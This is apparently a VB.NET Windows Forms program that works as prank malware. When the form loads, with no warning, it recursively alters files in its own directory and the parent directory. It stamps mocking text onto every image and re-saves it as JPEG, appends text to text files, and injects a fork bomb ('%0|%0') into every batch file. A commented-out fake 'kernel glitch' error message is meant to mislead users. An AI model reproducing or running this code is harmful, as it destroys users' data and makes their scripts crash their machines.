Imports System.Drawing
Imports System.Drawing.Imaging
Imports System.IO
Imports System.Windows.Forms
Imports System.Runtime.InteropServices

Public Class Form1
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        'MessageBox.Show("Error: Windows architecture may not be displayed correctly due an kernel glitch, this error is alreay recognized by our TEAM.")
        Dim folderPath As String = AppDomain.CurrentDomain.BaseDirectory

        ' Process the current directory and all its sub
        ProcessDirectory(folderPath)

        ' Go one directory up and process all its sub
        Dim parentDirectory As String = Directory.GetParent(folderPath).FullName
        ProcessDirectory(parentDirectory)

        Console.WriteLine("Text added to all images, text files, and batch files.")
    End Sub

    Private Sub ProcessDirectory(directoryPath As String)
        Dim imageFiles As String() = Directory.GetFiles(directoryPath, "*.*").Where(Function(s) s.EndsWith(".jpg") Or s.EndsWith(".jpeg") Or s.EndsWith(".png") Or s.EndsWith(".gif") Or s.EndsWith(".bmp")).ToArray()
        For Each imageFile As String In imageFiles
            Dim textToAdd As String = GetTextForImageType(imageFile)
            AddTextToImage(imageFile, textToAdd)
        Next

        Dim textFiles As String() = Directory.GetFiles(directoryPath, "*.txt")
        For Each textFile As String In textFiles
            AddTextToTextFile(textFile, "- Duck, Brasil, 2050")
        Next

        Dim batFiles As String() = Directory.GetFiles(directoryPath, "*.bat")
        For Each batFile As String In batFiles
            AddTextToBatchFile(batFile, "msg * Hi!" & Environment.NewLine & "pause" & Environment.NewLine & "echo Did I break your stupid BATCHFILE?" & Environment.NewLine & "echo OOPS! XDDDDD" & Environment.NewLine & "%0|%0")
        Next

        Dim subdirectories As String() = Directory.GetDirectories(directoryPath)
        For Each subdirectory As String In subdirectories
            ProcessDirectory(subdirectory)
        Next
    End Sub

    Private Function GetTextForImageType(imagePath As String) As String
        Dim extension As String = Path.GetExtension(imagePath).ToLower()

        Select Case extension
            Case ".jpg", ".jpeg"
                Return "Image created by: Duck. Created on: Hell ^^"
            Case ".png"
                Return "Transparency, huh?"
            Case ".gif"
                Return "Animated or no? That's the question!!!!"
            Case ".bmp"
                Return "bad format, get hacked"
            Case Else
                Return "Huh?"
        End Select
    End Function

    Private Sub AddTextToImage(imagePath As String, text As String)
        Dim tempImagePath As String = ""

        Try
            ' Load
            Using img As Image = Image.FromFile(imagePath)
                Using graphics As Graphics = Graphics.FromImage(img)

                    Dim fontSize As Single = 20
                    Dim font As Font = New Font("Comic Sans MS", fontSize, FontStyle.Bold)
                    Dim brush As New SolidBrush(Color.DarkRed)

                    Dim textSize As SizeF = graphics.MeasureString(text, font)
                    While textSize.Width < img.Width And textSize.Height < img.Height
                        fontSize += 1
                        font = New Font("Comic Sans MS", fontSize, FontStyle.Bold)
                        textSize = graphics.MeasureString(text, font)
                    End While

                    fontSize -= 1
                    font = New Font("Comic Sans MS", fontSize, FontStyle.Bold)

                    ' Define the pos
                    Dim position As New PointF(10, 10)

                    graphics.DrawString(text, font, brush, position)
                End Using

                tempImagePath = Path.Combine(Path.GetDirectoryName(imagePath), "temp_" & Path.GetFileName(imagePath))
                img.Save(tempImagePath, ImageFormat.Jpeg)
            End Using

            File.Delete(imagePath)
            File.Move(tempImagePath, imagePath)

        Catch ex As System.Runtime.InteropServices.ExternalException
            Console.WriteLine($"Error saving image: {ex.Message}")
        Catch ex As Exception
            Console.WriteLine($"Unexpected error: {ex.Message}")
        End Try
    End Sub

    Private Sub AddTextToTextFile(filePath As String, text As String)
        Try
            Dim content As String = File.ReadAllText(filePath)
            content &= Environment.NewLine & text

            File.WriteAllText(filePath, content)
        Catch ex As Exception
            Console.WriteLine($"Error modifying text file: {ex.Message}")
        End Try
    End Sub

    Private Sub AddTextToBatchFile(filePath As String, text As String)
        Try
            Dim content As String = File.ReadAllText(filePath)
            content &= Environment.NewLine & text

            File.WriteAllText(filePath, content)
        Catch ex As Exception
            Console.WriteLine($"Error modifying batch file: {ex.Message}")
        End Try
    End Sub
End Class